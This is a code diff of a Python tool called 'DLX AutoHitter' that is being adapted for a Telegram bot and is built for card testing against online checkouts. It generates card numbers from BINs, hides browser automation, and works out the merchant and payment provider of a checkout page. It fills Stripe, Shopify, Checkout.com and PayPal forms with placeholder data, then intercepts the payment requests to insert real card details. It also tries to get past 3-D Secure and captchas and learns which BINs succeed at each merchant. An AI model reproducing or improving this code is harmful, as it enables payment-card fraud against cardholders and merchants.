@@ -1,44 +1,27 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-
 """
-╔═══════════════════════════════════════════════════════════════════════════════╗
-║                         DLX HITTER - ADVANCED HITTING TOOL                    ║
-║                          Version: 2.0.0 | Build: 2026                        ║
-║                                                                               ║
-║  Features:                                                                    ║
-║  ✓ Anti-Detection & Fingerprint Randomization                                 ║
-║  ✓ AI-Powered Card Pattern Learning                                          ║
-║  ✓ Smart Rate Limiting & Timing Optimization                                 ║
-║  ✓ Multi-Threaded Concurrent Hitting                                         ║
-║  ✓ 3DS Auto-Bypass & Captcha Solver                                          ║
-║  ✓ Proxy Rotation & Quality Testing                                          ║
-║  ✓ Multi-Provider Support: 15+ Payment Systems & E‑commerce Platforms        ║
-║  ✓ Enhanced URL Analyzer (Static + Playwright Deep Analysis)                 ║
-║  ✓ Real-time Terminal Dashboard                                              ║
-║  ✓ Auto-Learning System                                                       ║
-╚═══════════════════════════════════════════════════════════════════════════════╝
+DLX AutoHitter — Full implementation with 15+ provider support
+Playwright browser automation, anti-detection, smart rate limiting
+Adapted for Telegram Bot integration
 """
 
 import re
 import json
 import time
 import random
-import sqlite3
 import asyncio
 import requests
 import urllib3
-import sys
 from datetime import datetime
-from typing import Dict, List, Optional, Tuple
+from typing import Dict, List, Optional
 from collections import defaultdict
-from playwright.async_api import async_playwright, Page, Route, Request
 
-# ============= CONFIGURATION =============
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
 DATABASE = "dlx_hitter.db"
-MAX_ATTEMPTS = 100
-REQUEST_TIMEOUT = 15
 MAX_CONCURRENT = 3
+REQUEST_TIMEOUT = 15
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
@@ -47,38 +30,6 @@ USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
 ]
 
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-# ============= COLORED OUTPUT =============
-class Colors:
-    HEADER = '\033[95m'
-    BLUE = '\033[94m'
-    CYAN = '\033[96m'
-    GREEN = '\033[92m'
-    YELLOW = '\033[93m'
-    RED = '\033[91m'
-    WHITE = '\033[97m'
-    BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'
-    END = '\033[0m'
-
-def print_banner():
-    banner = f"""
-{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.END}
-{Colors.RED}{Colors.BOLD}║{Colors.YELLOW}  ██████╗ ██╗     ██╗  ██╗      ██╗  ██╗██╗████████╗████████╗███████╗██████╗  {Colors.RED}{Colors.BOLD}║{Colors.END}
-{Colors.RED}{Colors.BOLD}║{Colors.YELLOW}  ██╔══██╗██║     ╚██╗██╔╝      ██║  ██║██║╚══██╔══╝╚══██╔══╝██╔════╝██╔══██╗ {Colors.RED}{Colors.BOLD}║{Colors.END}
-{Colors.RED}{Colors.BOLD}║{Colors.YELLOW}  ██║  ██║██║      ╚███╔╝       ███████║██║   ██║      ██║   █████╗  ██████╔╝ {Colors.RED}{Colors.BOLD}║{Colors.END}
-{Colors.RED}{Colors.BOLD}║{Colors.YELLOW}  ██║  ██║██║      ██╔██╗       ██╔══██║██║   ██║      ██║   ██╔══╝  ██╔══██╗ {Colors.RED}{Colors.BOLD}║{Colors.END}
-{Colors.RED}{Colors.BOLD}║{Colors.YELLOW}  ██████╔╝███████╗██╔╝ ██╗      ██║  ██║██║   ██║      ██║   ███████╗██║  ██║ {Colors.RED}{Colors.BOLD}║{Colors.END}
-{Colors.RED}{Colors.BOLD}║{Colors.YELLOW}  ╚═════╝ ╚══════╝╚═╝  ╚═╝      ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═╝ {Colors.RED}{Colors.BOLD}║{Colors.END}
-{Colors.RED}{Colors.BOLD}║{Colors.CYAN}                    ADVANCED HITTING TOOL - VERSION 2.0                        {Colors.RED}{Colors.BOLD}║{Colors.END}
-{Colors.RED}{Colors.BOLD}║{Colors.GREEN}              Anti-Detection | AI Learning | Smart Rate Limit                  {Colors.RED}{Colors.BOLD}║{Colors.END}
-{Colors.RED}{Colors.BOLD}║{Colors.GREEN}      15+ Payment Systems & E‑commerce Platforms | Multi-Provider             {Colors.RED}{Colors.BOLD}║{Colors.END}
-{Colors.RED}{Colors.BOLD}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.END}
-    """
-    print(banner)
-    print(f"{Colors.CYAN}[+] DLX HITTER v3.0.0 Starting...{Colors.END}")
-    print(f"{Colors.CYAN}[+] Database: {DATABASE} | Max Concurrent: {MAX_CONCURRENT}{Colors.END}\n")
 
 # ============= PROVIDER DETECTION =============
 def detect_provider(url: str, html: str = "") -> str:
@@ -134,6 +85,7 @@ def detect_provider(url: str, html: str = "") -> str:
             return 'authorizenet'
     return 'unknown'
 
+
 # ============= ENHANCED URL ANALYZER =============
 class URLAnalyzer:
     @staticmethod
@@ -156,7 +108,7 @@ class URLAnalyzer:
                 m = re.search(pat, script, re.DOTALL)
                 if m:
                     try:
-                        if key in ('stripe','initial','payment','pi','pm'):
+                        if key in ('stripe', 'initial', 'payment', 'pi', 'pm'):
                             data = json.loads(m.group(1))
                             def extract(obj):
                                 if isinstance(obj, dict):
@@ -288,34 +240,31 @@ class URLAnalyzer:
 
     @staticmethod
     async def deep_analyze_with_playwright(url: str) -> Dict:
-        """Playwright ile sayfayı yükler ve JavaScript çalıştıktan sonra bilgileri çeker."""
+        """Load page with Playwright and extract info after JS execution."""
         result = {
-            'merchant': 'Unknown',
-            'product': 'Unknown',
-            'product_url': None,
-            'amount': None,
-            'currency': 'USD',
-            'success': False
+            'merchant': 'Unknown', 'product': 'Unknown', 'product_url': None,
+            'amount': None, 'currency': 'USD', 'success': False
         }
         try:
+            from playwright.async_api import async_playwright
             async with async_playwright() as p:
                 browser = await p.chromium.launch(headless=True, args=['--disable-blink-features=AutomationControlled', '--no-sandbox'])
                 context = await browser.new_context(ignore_https_errors=True)
                 page = await context.new_page()
                 await page.goto(url, timeout=60000, wait_until='domcontentloaded')
                 await asyncio.sleep(3)
-                
+
                 merchant = await page.evaluate('''() => {
                     const meta = document.querySelector('meta[property="og:site_name"]');
                     if (meta) return meta.content;
                     const title = document.title;
-                    const match = title.match(/(.+?)\s*[|–-]\s*(Stripe|Checkout|Shopify|PayPal|Braintree|Adyen|Square|Mollie|Klarna|Authorize\.Net|WooCommerce|BigCommerce|Wix|Ecwid)/);
+                    const match = title.match(/(.+?)\\s*[|–-]\\s*(Stripe|Checkout|Shopify|PayPal|Braintree|Adyen|Square|Mollie|Klarna|Authorize\\.Net|WooCommerce|BigCommerce|Wix|Ecwid)/);
                     if (match) return match[1];
                     return title;
                 }''')
                 if merchant and merchant not in ['Stripe Checkout', 'Checkout', 'Shopify Checkout', 'PayPal']:
                     result['merchant'] = merchant.strip()
-                
+
                 product = await page.evaluate('''() => {
                     const meta = document.querySelector('meta[property="og:title"]');
                     if (meta) return meta.content;
@@ -325,7 +274,7 @@ class URLAnalyzer:
                 }''')
                 if product and product not in ['Stripe Checkout', 'Checkout', 'Shopify Checkout']:
                     result['product'] = product.strip()
-                
+
                 product_url = await page.evaluate('''() => {
                     const meta = document.querySelector('meta[property="og:url"]');
                     if (meta) return meta.content;
@@ -335,7 +284,7 @@ class URLAnalyzer:
                 }''')
                 if product_url:
                     result['product_url'] = product_url
-                
+
                 amount_text = await page.evaluate('''() => {
                     const selectors = ['[data-amount]', '.amount', '.price', '[class*="amount"]', '[class*="price"]'];
                     for (let sel of selectors) {
@@ -352,7 +301,7 @@ class URLAnalyzer:
                     if match:
                         amount = match.group(1).replace(',', '')
                         result['amount'] = f"${amount}"
-                
+
                 currency = await page.evaluate('''() => {
                     const meta = document.querySelector('meta[property="og:price:currency"]');
                     if (meta) return meta.content;
@@ -362,7 +311,7 @@ class URLAnalyzer:
                 }''')
                 if currency:
                     result['currency'] = currency.upper()
-                
+
                 result['success'] = True
                 await browser.close()
         except Exception as e:
@@ -372,20 +321,16 @@ class URLAnalyzer:
     @staticmethod
     async def analyze_url_with_fallback(url: str, use_deep: bool = False) -> Dict:
         result = {
-            'url': url,
-            'merchant': 'Unknown',
-            'product': 'Unknown',
-            'product_url': None,
-            'amount': None,
-            'currency': 'USD',
-            'success': False,
-            'error': None
+            'url': url, 'merchant': 'Unknown', 'product': 'Unknown',
+            'product_url': None, 'amount': None, 'currency': 'USD',
+            'provider': 'unknown', 'success': False, 'error': None
         }
         try:
             headers = {'User-Agent': random.choice(USER_AGENTS), 'Accept-Language': 'en-US,en;q=0.9'}
             resp = requests.get(url, timeout=15, verify=False, headers=headers, allow_redirects=True)
             if resp.status_code == 200:
                 html = resp.text
+                result['provider'] = detect_provider(url, html)
                 result['merchant'] = URLAnalyzer.extract_merchant(html)
                 result['product'] = URLAnalyzer.extract_product_name(html) or 'Unknown'
                 result['product_url'] = URLAnalyzer.extract_product_url(html)
@@ -396,45 +341,69 @@ class URLAnalyzer:
                 result['error'] = f"HTTP {resp.status_code}"
         except Exception as e:
             result['error'] = str(e)
-        
+
         if use_deep and (result['merchant'] == 'Unknown' or result['product'] in ['Stripe Checkout', 'Checkout', 'Shopify Checkout']):
-            print(f"{Colors.YELLOW}[!] Static analysis incomplete, performing deep analysis with Playwright...{Colors.END}")
             deep = await URLAnalyzer.deep_analyze_with_playwright(url)
-            if deep['success']:
+            if deep.get('success'):
                 if deep['merchant'] != 'Unknown':
                     result['merchant'] = deep['merchant']
                 if deep['product'] != 'Unknown':
                     result['product'] = deep['product']
-                if deep['product_url']:
+                if deep.get('product_url'):
                     result['product_url'] = deep['product_url']
-                if deep['amount']:
+                if deep.get('amount'):
                     result['amount'] = deep['amount']
-                if deep['currency'] != 'USD':
+                if deep.get('currency', 'USD') != 'USD':
                     result['currency'] = deep['currency']
         return result
 
-# ============= DATABASE SETUP =============
-def init_db():
-    conn = sqlite3.connect(DATABASE)
-    c = conn.cursor()
-    c.execute('''CREATE TABLE IF NOT EXISTS bins (id INTEGER PRIMARY KEY AUTOINCREMENT, bin TEXT)''')
-    c.execute('''CREATE TABLE IF NOT EXISTS cards (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        card_number TEXT, month TEXT, year TEXT, cvv TEXT,
-        success_count INTEGER DEFAULT 0, fail_count INTEGER DEFAULT 0
-    )''')
-    c.execute('''CREATE TABLE IF NOT EXISTS hits (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        timestamp TEXT, card TEXT, merchant TEXT, product TEXT, amount TEXT,
-        success INTEGER, decline_code TEXT, receipt_url TEXT, response_time REAL
-    )''')
-    c.execute('''CREATE TABLE IF NOT EXISTS patterns (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        merchant TEXT, bin_pattern TEXT, success_count INTEGER DEFAULT 0, fail_count INTEGER DEFAULT 0
-    )''')
-    conn.commit()
-    conn.close()
-    print(f"{Colors.GREEN}[✓] Database initialized{Colors.END}")
+    @staticmethod
+    def analyze(url: str) -> Dict:
+        """Synchronous analyze for bot integration."""
+        result = {
+            'url': url, 'merchant': 'Unknown', 'product': 'Unknown',
+            'product_url': None, 'amount': None, 'currency': 'USD',
+            'provider': 'unknown', 'error': None,
+        }
+        try:
+            headers = {'User-Agent': random.choice(USER_AGENTS), 'Accept-Language': 'en-US,en;q=0.9'}
+            resp = requests.get(url, timeout=15, verify=False, headers=headers, allow_redirects=True)
+            if resp.status_code == 200:
+                html = resp.text
+                result['provider'] = detect_provider(url, html)
+                result['merchant'] = URLAnalyzer.extract_merchant(html)
+                result['product'] = URLAnalyzer.extract_product_name(html) or 'Unknown'
+                result['product_url'] = URLAnalyzer.extract_product_url(html)
+                result['amount'] = URLAnalyzer.extract_amount(html)
+                result['currency'] = URLAnalyzer.extract_currency(html)
+            else:
+                result['error'] = f"HTTP {resp.status_code}"
+        except Exception as e:
+            result['error'] = str(e)[:80]
+
+        # If static analysis incomplete, try deep analysis
+        if result['merchant'] == 'Unknown' or result['product'] in [None, 'Unknown', 'Stripe Checkout', 'Checkout', 'Shopify Checkout']:
+            try:
+                loop = asyncio.new_event_loop()
+                asyncio.set_event_loop(loop)
+                deep = loop.run_until_complete(URLAnalyzer.deep_analyze_with_playwright(url))
+                loop.close()
+                if deep.get('success'):
+                    if deep['merchant'] != 'Unknown':
+                        result['merchant'] = deep['merchant']
+                    if deep['product'] != 'Unknown':
+                        result['product'] = deep['product']
+                    if deep.get('product_url'):
+                        result['product_url'] = deep['product_url']
+                    if deep.get('amount'):
+                        result['amount'] = deep['amount']
+                    if deep.get('currency', 'USD') != 'USD':
+                        result['currency'] = deep['currency']
+            except Exception:
+                pass
+
+        return result
+
 
 # ============= FINGERPRINT =============
 class FingerprintGenerator:
@@ -446,7 +415,7 @@ class FingerprintGenerator:
             'locale': 'en-US',
             'timezone_id': 'America/New_York'
         }
-    
+
     @staticmethod
     def get_stealth_script() -> str:
         return """
@@ -455,11 +424,12 @@ class FingerprintGenerator:
         Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
         """
 
+
 # ============= CARD PATTERN LEARNER =============
 class CardPatternLearner:
     def __init__(self):
         self.patterns: Dict[str, Dict[str, Dict]] = defaultdict(dict)
-    
+
     def learn(self, card: Dict, merchant: str, success: bool):
         bin_pattern = card['card'][:6]
         if merchant not in self.patterns:
@@ -470,7 +440,7 @@ class CardPatternLearner:
             self.patterns[merchant][bin_pattern]['success'] += 1
         else:
             self.patterns[merchant][bin_pattern]['fail'] += 1
-    
+
     def suggest_best_pattern(self, merchant: str) -> Optional[str]:
         if merchant not in self.patterns:
             return None
@@ -485,12 +455,13 @@ class CardPatternLearner:
                     best = pattern
         return best
 
+
 # ============= SMART RATE LIMITER =============
 class SmartRateLimiter:
     def __init__(self):
         self.current_delay = 1.0
         self.consecutive_failures = 0
-    
+
     def calculate_delay(self, last_result: str) -> float:
         if last_result == 'success':
             self.consecutive_failures = 0
@@ -499,6 +470,7 @@ class SmartRateLimiter:
             self.consecutive_failures += 1
             self.current_delay = min(8, self.current_delay * 1.2 + self.consecutive_failures * 0.2)
         return max(0.5, min(10, self.current_delay))
+
 
 # ============= CARD GENERATOR =============
 class CardGenerator:
@@ -509,7 +481,7 @@ class CardGenerator:
         if re.match(r'^5[1-5]', first6) or re.match(r'^2[2-7]', first6): return 'mastercard'
         if re.match(r'^4', first6): return 'visa'
         return 'unknown'
-    
+
     @staticmethod
     def luhn_checksum(card_number: str) -> int:
         def digits_of(n): return [int(d) for d in str(n)]
@@ -520,54 +492,44 @@ class CardGenerator:
         for d in even_digits:
             checksum += sum(digits_of(d * 2))
         return checksum % 10
-    
+
     @staticmethod
     def generate_card(bin_number: str) -> Optional[Dict]:
         if not bin_number or len(bin_number) < 4:
             return None
-        
         parts = bin_number.split('|')
         bin_pattern = re.sub(r'[^0-9xX]', '', parts[0])
         test_bin = bin_pattern.replace('x', '0').replace('X', '0')
         brand = CardGenerator.get_card_brand(test_bin)
-        
         target_len = 15 if brand == 'amex' else 16
         cvv_len = 4 if brand == 'amex' else 3
-        
         card = ''
         for c in bin_pattern:
             card += str(random.randint(0, 9)) if c.lower() == 'x' else c
-        
         remaining = target_len - len(card) - 1
         for _ in range(remaining):
             card += str(random.randint(0, 9))
-        
         for i in range(10):
             if CardGenerator.luhn_checksum(card + str(i)) == 0:
                 check_digit = i
                 break
         else:
             check_digit = 0
-        
         full_card = card + str(check_digit)
-        
         month = f"{random.randint(1, 12):02d}"
         if len(parts) > 1 and parts[1]:
             month = parts[1].zfill(2) if parts[1].lower() != 'xx' else f"{random.randint(1, 12):02d}"
-        
         year = f"{datetime.now().year + random.randint(1, 5):02d}"
         if len(parts) > 2 and parts[2]:
             year = parts[2].zfill(2) if parts[2].lower() != 'xx' else f"{datetime.now().year + random.randint(1, 5):02d}"
-        
         cvv = ''.join(str(random.randint(0, 9)) for _ in range(cvv_len))
         if len(parts) > 3 and parts[3]:
             if parts[3].lower() in ('xxx', 'xxxx'):
                 cvv = ''.join(str(random.randint(0, 9)) for _ in range(cvv_len))
             else:
                 cvv = parts[3].zfill(cvv_len)
-        
         return {'card': full_card, 'month': month, 'year': year, 'cvv': cvv, 'brand': brand}
-    
+
     @staticmethod
     def generate_cards(bin_number: str, count: int = 10) -> List[Dict]:
         cards = []
@@ -577,24 +539,57 @@ class CardGenerator:
                 cards.append(card)
         return cards
 
+
 # ============= BASE AUTOFILL CLASS =============
 class BaseAutofill:
-    def __init__(self, page: Page):
+    MASKED_CARD = "4242424242424242"
+    MASKED_EXPIRY = "01/30"
+    MASKED_CVV = "123"
+    CARD_SELECTORS = []
+    EXPIRY_SELECTORS = []
+    CVC_SELECTORS = []
+    NAME_SELECTORS = []
+    EMAIL_SELECTORS = []
+    SUBMIT_SELECTORS = []
+
+    def __init__(self, page):
         self.page = page
         self.real_card = None
-    
+
     async def enable_card_replace(self, real_card: Dict):
         self.real_card = real_card
-        # To be overridden
-    
-    async def fill_card(self, card: Dict):
-        # To be overridden
-        pass
-    
-    async def submit(self) -> bool:
-        # To be overridden
+
+    async def find_and_fill_field(self, selectors: List[str], value: str):
+        for sel in selectors:
+            try:
+                element = await self.page.query_selector(sel)
+                if element and await element.is_visible():
+                    await element.click()
+                    await element.fill(value)
+                    return True
+            except:
+                continue
         return False
-    
+
+    async def fill_card(self, card: Dict):
+        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
+        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
+        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
+        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
+        email = f"dlx{random.randint(100,9999)}@example.com"
+        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
+
+    async def submit(self) -> bool:
+        for sel in self.SUBMIT_SELECTORS:
+            try:
+                btn = await self.page.query_selector(sel)
+                if btn and await btn.is_visible():
+                    await btn.click()
+                    return True
+            except:
+                continue
+        return False
+
     async def detect_3ds(self) -> bool:
         iframes = await self.page.query_selector_all('iframe[src*="3ds"], iframe[src*="challenge"]')
         for iframe in iframes:
@@ -604,7 +599,7 @@ class BaseAutofill:
         if '3D Secure' in text or 'Authentication' in text:
             return True
         return False
-    
+
     async def wait_for_3ds(self, timeout: int = 10000) -> bool:
         start = time.time()
         while (time.time() - start) * 1000 < timeout:
@@ -612,7 +607,7 @@ class BaseAutofill:
                 return True
             await asyncio.sleep(0.5)
         return False
-    
+
     async def auto_complete_3ds(self) -> bool:
         if not await self.detect_3ds():
             return False
@@ -627,7 +622,7 @@ class BaseAutofill:
             await asyncio.sleep(3)
             return True
         return False
-    
+
     async def handle_captcha(self):
         try:
             frame = self.page.frame_locator('iframe[src*="hcaptcha.com"]')
@@ -641,6 +636,7 @@ class BaseAutofill:
             pass
         return False
 
+
 # ============= STRIPE AUTOFILL =============
 class StripeAutofill(BaseAutofill):
     CARD_SELECTORS = [
@@ -650,44 +646,38 @@ class StripeAutofill(BaseAutofill):
         'input[aria-label*="Card number"]', '[class*="CardNumberInput"] input',
         'input[name="number"]', 'input[id*="card-number"]'
     ]
-    
     EXPIRY_SELECTORS = [
         '#cardExpiry', '[name="cardExpiry"]', '[autocomplete="cc-exp"]',
         '[data-elements-stable-field-name="cardExpiry"]',
         'input[placeholder*="MM / YY"]', 'input[placeholder*="MM/YY"]',
         'input[placeholder*="MM"]', '[class*="CardExpiry"] input'
     ]
-    
     CVC_SELECTORS = [
         '#cardCvc', '[name="cardCvc"]', '[autocomplete="cc-csc"]',
         '[data-elements-stable-field-name="cardCvc"]',
         'input[placeholder*="CVC"]', 'input[placeholder*="CVV"]',
         '[class*="CardCvc"] input', 'input[name="cvc"]'
     ]
-    
     NAME_SELECTORS = [
         '#billingName', '[name="billingName"]', '[autocomplete="cc-name"]',
         'input[placeholder*="Name on card"]', 'input[name="name"]'
     ]
-    
     EMAIL_SELECTORS = [
         'input[type="email"]', 'input[name*="email"]', 'input[autocomplete="email"]',
         'input[placeholder*="email"]'
     ]
-    
     SUBMIT_SELECTORS = [
         '.SubmitButton', '[class*="SubmitButton"]', 'button[type="submit"]',
         '[data-testid*="submit"]', 'button:has-text("Pay")'
     ]
-    
     MASKED_CARD = "0000000000000000"
     MASKED_EXPIRY = "01/30"
     MASKED_CVV = "000"
-    
+
     async def enable_card_replace(self, real_card: Dict):
         self.real_card = real_card
-        
-        async def intercept_route(route: Route, request: Request):
+
+        async def intercept_route(route, request):
             if request.method == "POST" and "stripe.com" in request.url:
                 post_data = request.post_data
                 if post_data and self.real_card:
@@ -699,39 +689,9 @@ class StripeAutofill(BaseAutofill):
                     await route.continue_(post_data=post_data)
                     return
             await route.continue_()
-        
+
         await self.page.route("**/*", intercept_route)
-    
-    async def find_and_fill_field(self, selectors: List[str], value: str):
-        for sel in selectors:
-            try:
-                element = await self.page.query_selector(sel)
-                if element and await element.is_visible():
-                    await element.click()
-                    await element.fill(value)
-                    return True
-            except:
-                continue
-        return False
-    
-    async def fill_card(self, card: Dict):
-        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
-        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
-        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
-        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
-        email = f"dlx{random.randint(100,9999)}@example.com"
-        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
-    
-    async def submit(self) -> bool:
-        for sel in self.SUBMIT_SELECTORS:
-            try:
-                btn = await self.page.query_selector(sel)
-                if btn and await btn.is_visible():
-                    await btn.click()
-                    return True
-            except:
-                continue
-        return False
+
 
 # ============= CHECKOUT.COM AUTOFILL =============
 class CheckoutComAutofill(BaseAutofill):
@@ -740,42 +700,36 @@ class CheckoutComAutofill(BaseAutofill):
         'input[placeholder*="Card number"]', 'input[aria-label*="Card number"]',
         '[data-testid="card-number"]', '#payment-card-number'
     ]
-    
     EXPIRY_SELECTORS = [
         'input[data-frames="expiry-date"]', '#expiry-date', 'input[name="expiry"]',
         'input[placeholder*="MM/YY"]', 'input[placeholder*="MM / YY"]',
         '[data-testid="expiry-date"]'
     ]
-    
     CVC_SELECTORS = [
         'input[data-frames="cvv"]', '#cvv', 'input[name="cvv"]',
         'input[placeholder*="CVC"]', 'input[placeholder*="CVV"]',
         '[data-testid="cvv"]'
     ]
-    
     NAME_SELECTORS = [
         'input[data-frames="name"]', '#name', 'input[name="name"]',
         'input[placeholder*="Name on card"]', '[data-testid="cardholder-name"]'
     ]
-    
     EMAIL_SELECTORS = [
         'input[type="email"]', '#email', 'input[name="email"]',
         'input[placeholder*="email"]'
     ]
-    
     SUBMIT_SELECTORS = [
         'button[type="submit"]', '.pay-button', '[data-testid="pay-button"]',
         'button:has-text("Pay")', 'button:has-text("Submit")'
     ]
-    
     MASKED_CARD = "4242424242424242"
     MASKED_EXPIRY = "01/30"
     MASKED_CVV = "123"
-    
+
     async def enable_card_replace(self, real_card: Dict):
         self.real_card = real_card
-        
-        async def intercept_route(route: Route, request: Request):
+
+        async def intercept_route(route, request):
             if request.method == "POST" and ("checkout.com" in request.url or "api.checkout.com" in request.url):
                 post_data = request.post_data
                 if post_data and self.real_card:
@@ -788,39 +742,9 @@ class CheckoutComAutofill(BaseAutofill):
                     await route.continue_(post_data=post_data)
                     return
             await route.continue_()
-        
+
         await self.page.route("**/*", intercept_route)
-    
-    async def find_and_fill_field(self, selectors: List[str], value: str):
-        for sel in selectors:
-            try:
-                element = await self.page.query_selector(sel)
-                if element and await element.is_visible():
-                    await element.click()
-                    await element.fill(value)
-                    return True
-            except:
-                continue
-        return False
-    
-    async def fill_card(self, card: Dict):
-        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
-        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
-        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
-        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
-        email = f"dlx{random.randint(100,9999)}@example.com"
-        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
-    
-    async def submit(self) -> bool:
-        for sel in self.SUBMIT_SELECTORS:
-            try:
-                btn = await self.page.query_selector(sel)
-                if btn and await btn.is_visible():
-                    await btn.click()
-                    return True
-            except:
-                continue
-        return False
+
 
 # ============= SHOPIFY AUTOFILL =============
 class ShopifyAutofill(BaseAutofill):
@@ -829,42 +753,36 @@ class ShopifyAutofill(BaseAutofill):
         'input[aria-label="Card number"]', '[data-testid="card-number"]',
         'input[placeholder*="Card number"]', '.card-number'
     ]
-    
     EXPIRY_SELECTORS = [
         '#expiry', 'input[name="expiry"]', '[autocomplete="cc-exp"]',
         'input[aria-label="Expiry date"]', '[data-testid="expiry-date"]',
         'input[placeholder*="MM/YY"]', '.expiry-date'
     ]
-    
     CVC_SELECTORS = [
         '#verification_value', 'input[name="verification_value"]', '[autocomplete="cc-csc"]',
         'input[aria-label="Security code"]', '[data-testid="security-code"]',
         'input[placeholder*="CVC"]', '.cvv'
     ]
-    
     NAME_SELECTORS = [
         '#name', 'input[name="name"]', '[autocomplete="cc-name"]',
         'input[aria-label="Name on card"]', '[data-testid="cardholder-name"]'
     ]
-    
     EMAIL_SELECTORS = [
         '#email', 'input[name="email"]', 'input[type="email"]',
         'input[aria-label="Email"]', '[data-testid="email"]'
     ]
-    
     SUBMIT_SELECTORS = [
         'button[type="submit"]', '[data-testid="pay-button"]', '.pay-button',
         'button:has-text("Pay")', 'button:has-text("Complete order")'
     ]
-    
     MASKED_CARD = "4242424242424242"
     MASKED_EXPIRY = "01/30"
     MASKED_CVV = "123"
-    
+
     async def enable_card_replace(self, real_card: Dict):
         self.real_card = real_card
-        
-        async def intercept_route(route: Route, request: Request):
+
+        async def intercept_route(route, request):
             if request.method == "POST" and ("shopify.com" in request.url or "myshopify.com" in request.url or "stripe.com" in request.url):
                 post_data = request.post_data
                 if post_data and self.real_card:
@@ -879,39 +797,9 @@ class ShopifyAutofill(BaseAutofill):
                     await route.continue_(post_data=post_data)
                     return
             await route.continue_()
-        
+
         await self.page.route("**/*", intercept_route)
-    
-    async def find_and_fill_field(self, selectors: List[str], value: str):
-        for sel in selectors:
-            try:
-                element = await self.page.query_selector(sel)
-                if element and await element.is_visible():
-                    await element.click()
-                    await element.fill(value)
-                    return True
-            except:
-                continue
-        return False
-    
-    async def fill_card(self, card: Dict):
-        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
-        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
-        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
-        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
-        email = f"dlx{random.randint(100,9999)}@example.com"
-        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
-    
-    async def submit(self) -> bool:
-        for sel in self.SUBMIT_SELECTORS:
-            try:
-                btn = await self.page.query_selector(sel)
-                if btn and await btn.is_visible():
-                    await btn.click()
-                    return True
-            except:
-                continue
-        return False
+
 
 # ============= PAYPAL AUTOFILL =============
 class PayPalAutofill(BaseAutofill):
@@ -920,42 +808,36 @@ class PayPalAutofill(BaseAutofill):
         'input[aria-label="Card number"]', '[data-testid="card-number"]',
         'input[placeholder*="Card number"]'
     ]
-    
     EXPIRY_SELECTORS = [
         '#exp-date', 'input[name="expDate"]', '[autocomplete="cc-exp"]',
         'input[aria-label="Expiration date"]', '[data-testid="expiry-date"]',
         'input[placeholder*="MM/YY"]'
     ]
-    
     CVC_SELECTORS = [
         '#cvv', 'input[name="cvv"]', '[autocomplete="cc-csc"]',
         'input[aria-label="Security code"]', '[data-testid="cvv"]',
         'input[placeholder*="CVC"]'
     ]
-    
     NAME_SELECTORS = [
         '#cardholder-name', 'input[name="cardholderName"]', '[autocomplete="cc-name"]',
         'input[aria-label="Name on card"]', '[data-testid="cardholder-name"]'
     ]
-    
     EMAIL_SELECTORS = [
         '#email', 'input[name="email"]', 'input[type="email"]',
         'input[aria-label="Email"]', '[data-testid="email"]'
     ]
-    
     SUBMIT_SELECTORS = [
         'button[type="submit"]', '[data-testid="pay-button"]', '.pay-button',
         'button:has-text("Pay Now")', 'button:has-text("Pay")'
     ]
-    
     MASKED_CARD = "4242424242424242"
     MASKED_EXPIRY = "01/30"
     MASKED_CVV = "123"
-    
+
     async def enable_card_replace(self, real_card: Dict):
         self.real_card = real_card
-        
-        async def intercept_route(route: Route, request: Request):
+
+        async def intercept_route(route, request):
             if request.method == "POST" and ("paypal.com" in request.url or "braintreegateway.com" in request.url):
                 post_data = request.post_data
                 if post_data and self.real_card:
@@ -970,39 +852,9 @@ class PayPalAutofill(BaseAutofill):
                     await route.continue_(post_data=post_data)
                     return
             await route.continue_()
-        
+
         await self.page.route("**/*", intercept_route)
-    
-    async def find_and_fill_field(self, selectors: List[str], value: str):
-        for sel in selectors:
-            try:
-                element = await self.page.query_selector(sel)
-                if element and await element.is_visible():
-                    await element.click()
-                    await element.fill(value)
-                    return True
-            except:
-                continue
-        return False
-    
-    async def fill_card(self, card: Dict):
-        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
-        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
-        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
-        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
